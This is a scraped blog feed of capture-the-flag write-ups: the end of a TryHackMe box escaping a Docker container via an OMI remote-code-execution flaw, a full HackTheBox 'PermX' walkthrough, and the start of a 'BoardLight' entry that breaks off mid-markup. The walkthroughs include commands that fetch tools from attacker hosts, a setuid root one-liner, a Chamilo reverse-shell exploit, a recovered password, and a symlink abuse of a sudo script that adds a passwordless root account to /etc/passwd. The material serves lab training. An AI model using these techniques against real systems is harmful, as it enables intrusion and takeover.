<span class="hljs-built_in">cd</span> /<span class="hljs-built_in">cd</span> /daemon@4a70924bafa0:/$ <span class="hljs-built_in">ls</span><span class="hljs-built_in">ls</span>binbootdevetchomeliblib64mediamntoptprocrootrunsbinsrvsystmpusrvardaemon@4a70924bafa0:/$ <span class="hljs-built_in">ls</span> -la<span class="hljs-built_in">ls</span> -latotal 76drwxr-xr-x   1 root root 4096 Feb 23  2022 .drwxr-xr-x   1 root root 4096 Feb 23  2022 ..-rwxr-xr-x   1 root root    0 Feb 23  2022 .dockerenvdrwxr-xr-x   1 root root 4096 Oct  8  2021 bindrwxr-xr-x   2 root root 4096 Jun 13  2021 bootdrwxr-xr-x   5 root root  340 May 28 17:55 devdrwxr-xr-x   1 root root 4096 Feb 23  2022 etcdrwxr-xr-x   2 root root 4096 Jun 13  2021 homedrwxr-xr-x   1 root root 4096 Oct  8  2021 libdrwxr-xr-x   2 root root 4096 Sep 27  2021 lib64drwxr-xr-x   2 root root 4096 Sep 27  2021 mediadrwxr-xr-x   2 root root 4096 Sep 27  2021 mntdrwxr-xr-x   2 root root 4096 Sep 27  2021 optdr-xr-xr-x 167 root root    0 May 28 17:55 procdrwx------   1 root root 4096 Oct  8  2021 rootdrwxr-xr-x   3 root root 4096 Sep 27  2021 rundrwxr-xr-x   1 root root 4096 Oct  8  2021 sbindrwxr-xr-x   2 root root 4096 Sep 27  2021 srvdr-xr-xr-x  13 root root    0 May 28 17:55 sysdrwxrwxrwt   1 root root 4096 Feb 23  2022 tmpdrwxr-xr-x   1 root root 4096 Sep 27  2021 usrdrwxr-xr-x   1 root root 4096 Sep 27  2021 var</code></pre><p>Something interesting .. a docker.. </p><p>So that basically means we’re inside a docker container.</p><p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/329dcd2c-3f6e-4f1b-b80a-7e6d41060e0f/Screenshot_2024-05-28_at_21.20.19.png" alt="Screenshot 2024-05-28 at 21.20.19.png"></p><p><strong>A Docker is a tool designed to make it easier to create, deploy, and run applications by using containers. Containers allow a developer to package up an application with all parts it needs, such as libraries and other dependencies, and ship it all out as one package. By doing so, thanks to the container, the developer can rest assured that the application will run on any other Linux machine regardless of any customized settings that machine might have that could differ from the machine used for writing and testing the code.</strong></p><p><strong>LinPEAS</strong> is a script used in penetration testing to automate the process of enumerating possible paths to escalate privileges on a Linux system.</p><p>Uploading <strong>LinPEAS</strong></p><ul><li>Start a python3 http.server:</li></ul><pre><code class="hljs bash">└─$ python3 -m http.server</code></pre><ul><li>In our shell → Go to &#x2F;tmp and we run this command to download linpeas:</li></ul><pre><code class="hljs bash">daemon@4a70924bafa0:/tmp$ curl -O http://10.9.3.177:8000/linpeas.shcurl -O http://10.9.2.5:8000/nmap</code></pre><p>→ chmod +x</p><pre><code class="hljs bash">daemon@4a70924bafa0:/tmp$ <span class="hljs-built_in">chmod</span> +x linpeas.sh</code></pre><p>Now run linpeas with <code>./linpeas.sh</code></p><p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/3100e61a-2d6f-472b-8e3c-be92b733573d/Screenshot_2024-05-28_at_21.41.41.png" alt="Screenshot 2024-05-28 at 21.41.41.png"></p><p>Found something:</p><p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/44fc5482-0d21-41fa-bc1b-c50c68dc3941/Untitled.png" alt="Untitled"></p><p>→ After searching on GTFOBins we found a oneliner command that will get us root privileges</p><ul><li>commands used:</li></ul><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span></code></pre><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span>root</code></pre><p>Spawning a &#x2F;bin&#x2F;bash shell</p><ul><li>command:</li></ul><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></code></pre><p>→ Get Flag:</p><pre><code class="hljs bash">root@4a70924bafa0:/root<span class="hljs-comment"># cat user.txt</span><span class="hljs-built_in">cat</span> user.txt</code></pre><p>User Flag: <code>THM&#123;eacffefe1d2aafcc15e70dc2f07f7ac1&#125;</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Now we need to upload nmap:</p><p>→ Go to &#x2F;usr&#x2F;bin because there we find nmap → Start a http server and run this command in the docker:</p><pre><code class="hljs bash">curl -O http://10.9.2.5:8000/nmap</code></pre><p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/62a5906c-7a08-43e4-9c9b-1de8cd2ae545/Untitled.png" alt="Untitled"></p><p>→ ifconfig:</p><p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/0720d1e1-8dec-4788-a687-7e71f4a75948/Untitled.png" alt="Untitled"></p><p>→ Scan the network with nmap:</p><pre><code class="hljs bash">root@4a70924bafa0:/tmp<span class="hljs-comment"># ./nmap 172.17.0.0/24</span>./nmap 172.17.0.0/24Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-07-19 19:38 UTCUnable to find nmap-services!  Resorting to /etc/servicesCannot find nmap-payloads. UDP payloads are disabled.Nmap scan report <span class="hljs-keyword">for</span> ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performedHost is up (-0.021s latency).Not shown: 1205 filtered portsPORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 02:42:93:DF:25:AC (Unknown)Nmap scan report <span class="hljs-keyword">for</span> 4a70924bafa0 (172.17.0.2)Host is up (0.0000080s latency).Not shown: 1206 closed portsPORT   STATE SERVICE80/tcp open  http</code></pre><p>Now we will scan the 172.17.0.1 IP address to see what services are running and we will find port 5986, After some research we found out that port 5986 is used by WinRM, or Windows Remote Management we also found this article after we searched for a <code>port 5986 CVE</code> :</p><p><a href="https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure">https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure</a></p><ul><li><strong>OMI is an Azure agent intended to facilitate remote management of linux VM’s hosted in Microsoft Azure</strong></li></ul><p>We downloaded the script to our machine and transfer it to the root shell</p><pre><code class="hljs python">root@4a70924bafa0:/tmp<span class="hljs-comment"># curl -O http://10.9.2.5:80/omi.py</span></code></pre><p>→ Run the script: </p><pre><code class="hljs python">root@4a70924bafa0:/tmp<span class="hljs-comment"># python3 omi.py -t 172.17.0.1 -p 5986 -c &#x27;id&#x27;</span>python3 omi.py -t <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -p <span class="hljs-number">5986</span> -c <span class="hljs-string">&#x27;id&#x27;</span>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)</code></pre><p>Now we can simply read the root flag:</p><pre><code class="hljs python">python3 omi.py -t <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -p <span class="hljs-number">5986</span> -c <span class="hljs-string">&#x27;cd ../../../../ &amp;&amp; cat /root/root.txt</span></code></pre><p>→ output:</p><pre><code class="hljs python">root@4a70924bafa0:/tmp<span class="hljs-comment"># python3 omi.py -t 172.17.0.1 -p 5986 -c &#x27;cd ../../../../ &amp;&amp; cat /root/root.txt&#x27;</span>&lt; -p <span class="hljs-number">5986</span> -c <span class="hljs-string">&#x27;cd ../../../../ &amp;&amp; cat /root/root.txt&#x27;</span>THM&#123;7f147ef1f36da9ae29529890a1b6011f&#125;</code></pre><p>Root Flag: <code>THM&#123;7f147ef1f36da9ae29529890a1b6011f&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PermX</title>
      <link href="/2024/07/26/PermX/"/>
      <url>/2024/07/26/PermX/</url>
      
        <content type="html"><![CDATA[<p><img src="/../permx_img/1*OV1xRlh47ksLyJvmS6g4ZQ.png" alt="alt text"></p><p><strong>Target IP Address: 10.10.11.23</strong></p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><p>Usually in the Information Gathering Phase i try to get as much information as possible about the web app that i’m testing.</p><h2 id="Nmap-Scanning"><a href="#Nmap-Scanning" class="headerlink" title="Nmap Scanning"></a>Nmap Scanning</h2><p>Nmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.23</code></pre><p>→ output</p><pre><code class="hljs bash">PORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63</code></pre><h2 id="NMAP-Full-Scanning"><a href="#NMAP-Full-Scanning" class="headerlink" title="NMAP Full Scanning"></a>NMAP Full Scanning</h2><ul><li>command used:(scanning the ports we got)</li></ul><pre><code class="hljs bash">└─$ nmap -A -sC -sV -p22,80  10.10.11.23 -Pn</code></pre><p>→ output:</p><pre><code class="hljs bash">PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)80/tcp open  http    Apache httpd 2.4.52|_http-server-header: Apache/2.4.52 (Ubuntu)|_http-title: Did not follow redirect to http://permx.htbService Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p><p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p><p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p><p>-&gt; SSH package version:</p><pre><code class="hljs bash">└─$ nc -vn 10.10.11.23 22(UNKNOWN) [10.10.11.23] 22 (ssh) openSSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10</code></pre><p>-&gt; SSH key fingerprint:</p><pre><code class="hljs bash">ssh root@10.10.11.23 The authenticity of host <span class="hljs-string">&#x27;10.10.11.23 (10.10.11.23)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.</span><span class="hljs-string">This key is not known by any other names.</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span></code></pre><h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80  (Default Port for HTTP)"></a>TCP 80  (Default Port for HTTP)</h3><p>Firstly we need to add the domain to &#x2F;etc&#x2F;hosts</p><ul><li><blockquote><p>Web Server:</p></blockquote></li></ul><pre><code class="hljs bash">└─$ curl -i http://permx.htb | <span class="hljs-built_in">head</span> -n 50  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0HTTP/1.1 200 OKDate: Fri, 26 Jul 2024 11:21:57 GMTServer: Apache/2.4.52 (Ubuntu)Last-Modified: Sat, 20 Jan 2024 14:59:26 GMTETag: <span class="hljs-string">&quot;8d56-60f61d7bd0f80&quot;</span>Accept-Ranges: bytesContent-Length: 36182Vary: Accept-EncodingContent-Type: text/html&lt;!DOCTYPE html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;    &lt;title&gt;eLEARNING&lt;/title&gt;    &lt;meta content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span> name=<span class="hljs-string">&quot;viewport&quot;</span>&gt;    &lt;meta content=<span class="hljs-string">&quot;&quot;</span> name=<span class="hljs-string">&quot;keywords&quot;</span>&gt;    &lt;meta content=<span class="hljs-string">&quot;&quot;</span> name=<span class="hljs-string">&quot;description&quot;</span>&gt;    &lt;!-- Favicon --&gt;    &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;img/favicon.ico&quot;</span> rel=<span class="hljs-string">&quot;icon&quot;</span>&gt;    &lt;!-- Google Web Fonts --&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;preconnect&quot;</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com&quot;</span>&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;preconnect&quot;</span> href=<span class="hljs-string">&quot;https://fonts.gstatic.com&quot;</span> crossorigin&gt;    &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css2?family=Heebo:wght@400;500;600&amp;family=Nunito:wght@600;700;800&amp;display=swap&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;    &lt;!-- Icon Font Stylesheet --&gt;    &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;    &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;    &lt;!-- Libraries Stylesheet --&gt;    &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;lib/animate/animate.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;    &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;lib/owlcarousel/assets/owl.carousel.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;    &lt;!-- Customized Bootstrap Stylesheet --&gt;    &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;    &lt;!-- Template Stylesheet --&gt;    &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;css/style.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- Spinner Start --&gt;    &lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;spinner&quot;</span> class=<span class="hljs-string">&quot;show bg-white position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center&quot;</span>&gt;        &lt;div class=<span class="hljs-string">&quot;spinner-border text-primary&quot;</span> style=<span class="hljs-string">&quot;width: 3rem; height: 3rem;&quot;</span> role=<span class="hljs-string">&quot;status&quot;</span>&gt;            &lt;span class=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;Loading...&lt;/span&gt;        &lt;/div&gt;    &lt;/div&gt; 36 36182   36 13025    0     0  89494      0 --:--:-- --:--:-- --:--:-- 89827curl: (23) Failure writing output to destination, passed 13280 returned 3104</code></pre><h1 id="Subdomain-Enumeration-with-wfuzz"><a href="#Subdomain-Enumeration-with-wfuzz" class="headerlink" title="Subdomain Enumeration with wfuzz"></a>Subdomain Enumeration with wfuzz</h1><p>Wfuzz was used for subdomain enumeration to identify hidden subdomains.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ wfuzz -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="hljs-string">&quot;HOST: FUZZ.permx.htb&quot;</span> -u http://permx.htb --hw 1053 --hl 9</code></pre><p>→ output:(found 2 subdomains)</p><pre><code class="hljs bash">=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                          =====================================================================000000001:   200        586 L    2466 W     36182 Ch    <span class="hljs-string">&quot;www - www&quot;</span>                                                                                                      000000477:   200        352 L    940 W      19347 Ch    <span class="hljs-string">&quot;lms - lms&quot;</span></code></pre><p><a href="http://www.permx.htb/">www.permx.htb</a></p><p>lms.permx.htb</p><ul><li>let’s add them to &#x2F;etc&#x2F;hosts</li></ul><p><img src="/../permx_img/1.png" alt="alt text"></p><p>The <code>lms</code> subdomain has some sort of Login form:</p><p><img src="/../permx_img/2.png" alt="alt text"></p><p>I wanted to start fuzzing but a simple thing i like to do when i am testing web apps is to check the &#x2F;robots.txt directory:</p><p><img src="/../permx_img/3.png" alt="alt text"></p><p>Note</p><pre><code class="hljs bash"><span class="hljs-comment"># Directories</span>Disallow: /app/Disallow: /bin/Disallow: /documentation/Disallow: /home/Disallow: /main/Disallow: /plugin/Disallow: /tests/Disallow: /vendor/<span class="hljs-comment"># Files</span>Disallow: /license.txtDisallow: /README.txtDisallow: /whoisonline.phpDisallow: /whoisonlinesession.php</code></pre><p>Started searching each directory and on <strong>&#x2F;documentation</strong> we found the version of Chamilo:</p><p><img src="/../permx_img/4.png" alt="alt text"></p><p>We should check for exploits now</p><ul><li>Found this one: (unauthenticated-big-upload)</li></ul><p><a href="https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc">https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc</a></p><p><strong>We are going to abuse this to get a reverse shell to our machine:</strong></p><ul><li>commands used to get a revshell:</li></ul><pre><code class="hljs bash">nc -lvnp 4444 python3 main.py -u http://example.com/chamilo -a revshell</code></pre><p>→ Got the reverse shell:</p><p><img src="/../permx_img/5.png" alt="alt text"></p><p>We found a user named <code>mtz</code> in &#x2F;home file, i guess we will connect to this user with ssh later on:</p><p><img src="/../permx_img/6.png" alt="alt text"></p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p><strong>LinPEAS</strong> is a script used in penetration testing to automate the process of enumerating possible paths to escalate privileges on a Linux system.</p><p><strong>Uploading LinPEAS to &#x2F;var&#x2F;www&#x2F;html</strong></p><p>→ Starting a python3 http server → Uploading the file with <code>wget</code> , change executable permissions to LinPEAS file:</p><pre><code class="hljs bash">python3 -m http.serverwget http://10.10.14.34:8000/linpeas.sh  <span class="hljs-built_in">chmod</span> +x linpeas.sh</code></pre><p>What i said earlier with user <code>mtz</code> it just turned out to be true:</p><p><img src="/../permx_img/7.png" alt="alt text"></p><p><strong>LinPEAS found a password too:</strong></p><p><img src="/../permx_img/8.png" alt="alt text"></p><p>User: <strong>mtz</strong></p><p>Pass: <strong>03F6lY3uXAP2bkW8</strong></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p><strong>Trying to connect with ssh to user mtz with the password that we just found</strong></p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ ssh mtz@10.10.11.23</code></pre><p>It worked:</p><p><img src="/../permx_img/9.png" alt="alt text"></p><h3 id="Sudo-l"><a href="#Sudo-l" class="headerlink" title="Sudo -l"></a><strong>Sudo -l</strong></h3><p>The <code>sudo -l</code> command lists the permitted (and forbidden) commands for the invoking user, helping to identify potential privilege escalation vectors on a Linux system during a penetration test.</p><p>→ output:</p><pre><code class="hljs bash">mtz@permx:~$ sudo -lMatching Defaults entries <span class="hljs-keyword">for</span> mtz on permx:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_ptyUser mtz may run the following commands on permx:    (ALL : ALL) NOPASSWD: /opt/acl.sh</code></pre><p>We can run <strong>&#x2F;opt&#x2F;acl.sh</strong> without password.</p><p>This is the script:</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$#</span>&quot;</span> -ne 3 ]; <span class="hljs-keyword">then</span>    /usr/bin/echo <span class="hljs-string">&quot;Usage: <span class="hljs-variable">$0</span> user perm file&quot;</span>    <span class="hljs-built_in">exit</span> 1<span class="hljs-keyword">fi</span>user=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>perm=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span>target=<span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span><span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span> != /home/mtz/* || <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span> == *..* ]]; <span class="hljs-keyword">then</span>    /usr/bin/echo <span class="hljs-string">&quot;Access denied.&quot;</span>    <span class="hljs-built_in">exit</span> 1<span class="hljs-keyword">fi</span><span class="hljs-comment"># Check if the path is a file</span><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span> ]; <span class="hljs-keyword">then</span>    /usr/bin/echo <span class="hljs-string">&quot;Target must be a file.&quot;</span>    <span class="hljs-built_in">exit</span> 1<span class="hljs-keyword">fi</span>/usr/bin/sudo /usr/bin/setfacl -m u:<span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$perm</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span></code></pre><p><strong>What the script does:</strong> </p><ol><li><strong>Argument Check</strong>: Ensures exactly three arguments are provided (user, permission, and file).</li><li><strong>Variable Assignment</strong>: Assigns the arguments to <code>user</code>, <code>perm</code>, and <code>target</code>.</li><li><strong>Path Validation</strong>: Checks if <code>target</code> is within <code>/home/mtz/</code> and doesn’t contain <code>..</code> to prevent directory traversal.</li><li><strong>File Check</strong>: Ensures the <code>target</code> is a file.</li><li><strong>Set ACL</strong>: Uses <code>setfacl</code> to modify Access Control List permissions for the specified <code>target</code>.</li></ol><h3 id="Creating-a-Symlink"><a href="#Creating-a-Symlink" class="headerlink" title="Creating a Symlink"></a><strong>Creating a Symlink</strong></h3><p>After some time thinking, what about linked files?</p><ul><li>command used:</li></ul><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /etc/shadow /home/mtz/test</code></pre><ul><li>This creates a symbolic link named <code>test</code> in the <code>/home/mtz</code> directory that points to <code>/etc/shadow</code>.</li><li>The <code>ln -s</code> command creates a shortcut (<code>/home/mtz/test</code>) that redirects operations to <code>/etc/shadow</code>.</li></ul><h3 id="Using-the-Script-to-Modify-Permissions"><a href="#Using-the-Script-to-Modify-Permissions" class="headerlink" title="Using the Script to Modify Permissions"></a><strong>Using the Script to Modify Permissions</strong></h3><ul><li>command used:</li></ul><pre><code class="hljs bash">sudo /opt/acl.sh mtz rw /home/mtz/test</code></pre><ul><li>Runs the script with <code>sudo</code>, which has the permission to execute <code>setfacl</code>.</li><li>The script gives the <code>mtz</code> user read and write (<code>rw</code>) permissions on the file located at <code>/home/mtz/test</code>, which is actually <code>/etc/shadow</code> due to the symlink.</li></ul><h3 id="Reading-the-Shadow-File"><a href="#Reading-the-Shadow-File" class="headerlink" title="Reading the Shadow File"></a><strong>Reading the Shadow File</strong></h3><ul><li>command used:</li></ul><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ./test</code></pre><p>→ output:</p><p><img src="/../permx_img/10.png" alt="alt text"></p><h3 id="Creating-Another-Symlink"><a href="#Creating-Another-Symlink" class="headerlink" title="Creating Another Symlink"></a>Creating Another Symlink</h3><ul><li>command used:</li></ul><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /etc/passwd /home/mtz/test</code></pre><p>Changes the symlink so that <code>/home/mtz/test</code> now points to <code>/etc/passwd</code>.</p><h3 id="Modifying-etc-passwd"><a href="#Modifying-etc-passwd" class="headerlink" title="Modifying /etc/passwd"></a><strong>Modifying <code>/etc/passwd</code></strong></h3><ul><li>commands used:</li></ul><pre><code class="hljs bash">sudo /opt/acl.sh mtz rw /home/mtz/test<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root3::0:0:root3:/root:/bin/bash&quot;</span> &gt;&gt; ./test</code></pre><ul><li>Runs the script again to modify permissions on the new symlink (<code>/etc/passwd</code>).</li><li>Appends <code>root3::0:0:root3:/root:/bin/bash</code> to <code>/etc/passwd</code> via the symlink.</li><li>This entry creates a new root user <code>root3</code> with no password.</li></ul><h3 id="Switching-to-user3"><a href="#Switching-to-user3" class="headerlink" title="Switching to user3"></a>Switching to user3</h3><ul><li>command used:</li></ul><pre><code class="hljs bash">su root3</code></pre><p>And we got root access:</p><p><img src="/../permx_img/11.png" alt="alt text"></p><h2 id="Getting-user-root-flags"><a href="#Getting-user-root-flags" class="headerlink" title="Getting user&amp;root flags"></a>Getting user&amp;root flags</h2><p>→ </p><pre><code class="hljs bash">root@permx:/home<span class="hljs-comment"># cd mtz</span>root@permx:/home/mtz<span class="hljs-comment"># cat user.txt</span>a74eb82f595d40bfee95eac992d40325root@permx:/home/mtz<span class="hljs-comment"># cd /root</span>root@permx:~<span class="hljs-comment"># cat root.txt</span>f3683cd32f888793455237a5451cc4e9</code></pre><p>User.txt Flag: <code>a74eb82f595d40bfee95eac992d40325</code></p><p>Root.txt Flag: <code>f3683cd32f888793455237a5451cc4e9</code></p><h2 id="Why-It-Works"><a href="#Why-It-Works" class="headerlink" title="Why It Works"></a>Why It Works</h2><ul><li><strong>Symlink Trick</strong>: By creating symbolic links, you trick the script into modifying ACLs of sensitive files like <code>/etc/shadow</code> and <code>/etc/passwd</code>.</li><li><strong>ACL Changes</strong>: The script’s ACL modifications provide read&#x2F;write access where it’s normally restricted.</li><li><strong>Root Privileges</strong>: By appending a new root user entry to <code>/etc/passwd</code>, you can switch to this new user and gain root access.</li></ul><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>→ The exploit works by abusing the script that modifies ACLs to elevate your privileges. By creating symlinks to sensitive files and using the script to alter their permissions, you can read and write to files that are usually protected. This allows you to create a new root user, giving you full control over the system.</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> CTF </tag>
            
            <tag> Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BoardLight</title>
      <link href="/2024/07/26/BoardLight/"/>
      <url>/2024/07/26/BoardLight/</url>
      
        <content type="html"><![CDATA[<p><img src="/../BoardLight_img/7768afed979c9abe917b0c20df49ceb8.webp" alt="alt text"></p><p><strong>Target IP Address: 10.10.11.11</strong></p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><p>Nmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.</p><ul><li>command used: (scanning for all ports fast and efficient)</li></ul><pre><code class="hljs jsx">sudo nmap -p- -sS --min-rate <span class="hljs-number">5000</span> --open -<span class="hljs-variable constant_">T5</span> -vvv -<span class="hljs-title class_">Pn</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span></code></pre><p>-&gt;output:</p><pre><code class="hljs jsx"><span class="hljs-title class_">Nmap</span> scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span><span class="hljs-title class_">Host</span> is up, received user-set (<span class="hljs-number">0.</span>043s latency).<span class="hljs-title class_">Scanned</span> at <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">16</span> <span class="hljs-number">14</span>:<span class="hljs-number">43</span>:<span class="hljs-number">57</span> <span class="hljs-variable constant_">EDT</span> <span class="hljs-keyword">for</span> 12s<span class="hljs-title class_">Not</span> <span class="hljs-attr">shown</span>: <span class="hljs-number">65166</span> closed tcp ports (reset), <span class="hljs-number">367</span> filtered tcp ports (no-response)<span class="hljs-title class_">Some</span> closed ports may be reported <span class="hljs-keyword">as</span> filtered due to --defeat-rst-ratelimit<span class="hljs-variable constant_">PORT</span>   <span class="hljs-variable constant_">STATE</span> <span class="hljs-variable constant_">SERVICE</span> <span class="hljs-variable constant_">REASON</span><span class="hljs-number">22</span>/tcp open  ssh     syn-ack ttl <span class="hljs-number">63</span><span class="hljs-number">80</span>/tcp open  http    syn-ack ttl <span class="hljs-number">63</span></code></pre><h2 id="NMAP-Full-Scanning"><a href="#NMAP-Full-Scanning" class="headerlink" title="NMAP Full Scanning"></a>NMAP Full Scanning</h2><ul><li>command used: ( scanning the ports we got )</li></ul><pre><code class="hljs jsx">nmap -A -sC -sV -p <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span></code></pre><p>  -&gt; output:</p><pre><code class="hljs jsx"><span class="hljs-title class_">Nmap</span> scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span><span class="hljs-title class_">Host</span> is up (<span class="hljs-number">0.</span>041s latency).<span 